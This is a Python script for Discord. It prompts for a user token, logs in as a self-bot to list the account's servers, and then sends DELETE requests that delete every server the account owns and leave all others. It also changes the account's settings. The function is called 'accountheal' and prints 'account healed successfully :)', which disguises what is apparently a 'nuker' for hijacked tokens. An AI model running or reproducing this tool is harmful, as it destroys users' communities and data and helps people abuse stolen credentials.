import threading
import requests
import discord
import os
import re

guildsIds = []

class Login(discord.Client):
    async def on_connect(self):
        for guild in self.guilds:
            guildsIds.append(guild.id)

        await self.logout()

    def run(self, token):
        try:
            super().run(token, bot=False)
        except BaseException:
            print("\nInvalid Token.")
            main()

def accountheal(token):
    headers = {'Authorization': token}
    print('healing account...')
    for guild in guildsIds:
        try:
            requests.delete(f'https://discord.com/api/v8/guilds/{guild}', headers=headers)
        except Exception as e:
            print(f"an error: {e}")
            
    for guild in guildsIds:
        try:
            requests.delete(
                f'https://discord.com/api/v6/users/@me/guilds/{guild}',
                headers=headers)
        except Exception as e:
            print(f"an error: {e}")

    setting = {"theme": "dark", "locale": "eu"}
    requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
                   
    print('account healed successfully :)')

token = str(input(f'[>>>] Token: '))
headers = {'Authorization': token, 'Content-Type': 'application/json'}
r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
if r.status_code == 200:
    os.system('cls')
    threads = 100
    Login().run(token)
    if threading.active_count() < threads:
        t = threading.Thread(target=accountheal, args=(token, ))
        t.start()
